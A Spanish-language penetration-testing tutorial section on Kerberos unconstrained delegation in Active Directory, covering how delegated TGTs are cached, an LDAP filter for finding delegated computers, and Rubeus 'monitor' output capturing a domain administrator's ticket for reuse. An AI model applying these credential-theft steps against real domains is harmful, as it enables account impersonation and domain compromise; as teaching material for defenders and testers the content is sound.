La **delegación** de Kerberos permite que un servicio actúe en nombre de un usuario contra otro servicio. El caso típico: una web se autentica con Kerberos y, por detrás, necesita hablar con una base de datos o un recurso de ficheros *como ese usuario*. El servidor web no conoce la contraseña del usuario, así que necesita un mecanismo para hacerlo: eso es la delegación.

Hay tres tipos (sin restricciones, restringida y basada en recursos). Este apartado cubre la **sin restricciones**, que fue la primera y la más peligrosa.

---

#### Cómo funciona

Se activa poniendo el flag `TRUSTED_FOR_DELEGATION` en el atributo `userAccountControl` del objeto de equipo. Cuando un cliente pide un ticket para un servicio que corre en esa máquina, el KDC marca el TGS-REP con `ok-as-delegate`. Eso le dice al cliente que el servidor es de confianza para delegar, así que al enviar el AP-REQ incluye **una copia de su propio TGT**. El equipo que recibe ese TGT lo guarda en memoria y puede usarlo para pedir tickets en nombre del usuario a **cualquier** servicio del dominio.

Ahí está el peligro: si comprometes un equipo con delegación sin restricciones, puedes extraer de memoria los TGT de todos los que se hayan autenticado contra él y suplantarlos en cualquier sitio.

Los DC siempre tienen delegación sin restricciones, pero eso no es el problema (tener admin local en un DC ya lo es todo de por sí).

#### Enumeración

```
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

sAMAccountName: dragon-dc$
sAMAccountName: server-web$
```

El filtro busca cuentas de equipo (`805306369`) con el bit `524288` (`TRUSTED_FOR_DELEGATION`) activo en el UAC.

#### El ataque: capturar TGT de la memoria

Si ya controlas el equipo delegado, el comando `monitor` captura y muestra los TGT cada vez que un usuario se autentica contra él:

```
Rubeus.exe monitor /nowrap

[*] 19/02/2025 14:56:32 UTC - Found new TGT:
  User                  :  victim@DRAGON.COM
  EndTime               :  20/02/2025 00:56:16
  Base64EncodedTicket   :  doIFj[...recortado...]kNPTQ==
```

En este caso hemos capturado el TGT de **victim**, un administrador de dominio. Ese ticket se puede inyectar y reutilizar para acceder a cualquier servicio como él.

- `/nowrap` → salida en una sola línea, lista para copiar el ticket.

El problema real de esta técnica es que **depende de que alguien interesante se autentique** contra el equipo mientras monitorizas. Para forzarlo sin esperar, se usan los "coerce" de autenticación, que se ven en el apartado de **S4U2self Computer Takeover**.
